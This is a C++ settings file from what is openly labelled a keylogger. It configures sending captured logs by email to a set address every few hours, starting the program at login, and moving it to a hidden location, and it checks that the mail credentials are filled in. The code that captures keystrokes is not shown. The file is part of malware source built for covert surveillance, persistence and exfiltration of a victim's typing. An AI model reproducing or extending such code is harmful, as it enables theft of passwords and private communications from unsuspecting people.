#include <fstream>
#include <string>
#include <sstream>
#include "Settings.h"
#include "IO.h"


//    88888888    8888888    888888888    8888888888    88888    88    8    8888888    88888888
//    8           8              8            8           8      8 8   8    8          8
//    8888888     8888           8            8           8      8  8  8    8   888    88888888
//          8     8              8            8           8      8   8 8    8     8           8
//    8888888     8888888        8            8         88888    8    88    8888888    88888888


//  [REQUIRED]
//  Set E-mail-address to send the mails from.
//  default: ""
const std::string Settings::mail_from = "";

//  [REQUIRED]
//  Set password corresponding to the E-mail-address ^.
//  default: ""
const std::string Settings::mail_pass = "";

//  [REQUIRED]
//  Set E-mail-address to send the mails to.
//  default: ""
const std::string Settings::mail_to = "";

//
//  Set inteval between each mail with logs in hours. Only use whole numbers.
//  default: 2
const unsigned long Settings::mail_interval = 2;

//
//  Set whether to make the program automatically start on login.
//  default: true
const bool Settings::autoStartProgram = false;

//
//  Set whether to make the program automatically migrate to a hidden location.
//  default: true
const bool Settings::autoSafeMigrate = true;

//
//  Set whether to make the program exit when automatic migration fails. Only relevant if autoSafeMigrate setting is set to true.
//  default: true
const bool Settings::exitOnMigrateFailure = true;

//
//  Set whether to use extra verbose logs.
//  default: false
const bool Settings::useVerboseLogs = false;


//
//	DONT MESS WITH ANY OF THIS, OR THE KEYLOGGER MIGHT NOT WORK!
//

std::string Settings::get_mail_from()       { return Settings::mail_from;           }
std::string Settings::get_mail_pass()       { return Settings::mail_pass;           }
std::string Settings::get_mail_to()         { return Settings::mail_to;             }
unsigned long Settings::get_mail_interval() { return Settings::mail_interval;       }
bool Settings::get_autoStartProgram()       { return Settings::autoStartProgram;    }
bool Settings::get_autoSafeMigrate()        { return Settings::autoSafeMigrate;     }
bool get_exitOnMigrateFailure()             { return Settings::exitOnMigrateFailure;}
bool Settings::get_useVerboseLogs()         { return Settings::useVerboseLogs;      }

bool Settings::InitSettings()
{

    bool allSettingsDefined = true;

    if (mail_from == "" || mail_from.find("@") == std::string::npos || mail_from.find(".") == std::string::npos)
    {
        IO::WriteDebugAppLog("'mail_from' was not at all or not properly defined...");
        allSettingsDefined = false;
    }

    if (mail_pass == "")
    {
        IO::WriteDebugAppLog("'mail_pass' was not at all or not properly defined...");
        allSettingsDefined = false;
    }

    if (mail_to == "" || mail_to.find("@") == std::string::npos || mail_to.find(".") == std::string::npos)
    {
        IO::WriteDebugAppLog("'mail_to' was not at all or not properly defined...");
        allSettingsDefined = false;
    }

    if (mail_interval <= 0)
    {
        IO::WriteDebugAppLog("'inteval' was not properly defined...");
        allSettingsDefined = false;
    }

    if (!allSettingsDefined)
    {
        IO::WriteDebugAppLog("Not all settings were defined, exiting...");
        return false;
    }
    else
        return true;
}